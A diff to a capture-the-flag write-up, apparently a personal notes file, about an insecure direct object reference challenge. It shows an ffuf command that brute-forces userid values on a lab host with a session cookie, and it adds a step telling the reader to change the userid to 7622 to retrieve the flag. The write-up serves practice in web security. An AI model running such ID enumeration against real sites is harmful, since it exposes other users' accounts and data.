@@ -49,6 +49,9 @@ Use burp suite to find the cookieId and use ffuf to bruteforce userIds from 1 to
 
 ffuf -u http://koala.hackingarena.no:802/profile.php?userid=FUZZ -H "Cookie: CalypId=AAABBBCCCDDD1731694671" -w "/home/kali/Desktop/userid.txt" -fs 29
 
+![[Pasted image 20241115184929.png]]
+
+Lastly, manually change the userId in the url of a web-browser to 7622 (Largest size) and retrieve the flag.
 # Additional Info
 
 Additional solution / info
